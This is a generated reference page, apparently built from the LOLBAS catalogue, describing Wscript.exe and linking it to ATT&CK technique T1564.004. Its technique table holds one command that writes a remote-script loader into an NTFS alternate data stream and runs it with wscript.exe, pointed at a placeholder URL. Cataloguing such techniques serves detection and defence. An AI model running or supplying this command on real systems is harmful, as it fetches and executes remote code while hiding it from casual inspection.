---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Wscript.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `wscript.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Wscript.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Used by Windows to execute scripts

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/wscript.md)
- Source verification: [source record](../../sources/lolbas/wscript.exe.md)

## Aliases

- `Wscript.exe`
- `wscript.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1564.004 - NTFS File Attributes](../../attack/techniques/T1564.004-ntfs-file-attributes.md) | explicit | source | Command metadata lists T1564.004: echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/wscript.exe.md)

## Source Verification

[source record](../../sources/lolbas/wscript.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@oddvarmoe'
Person: Oddvar Moe
- Handle: '@404death'
Person: SaiLay(valen)
Author: Oddvar Moe
Commands:
- Category: ADS
```
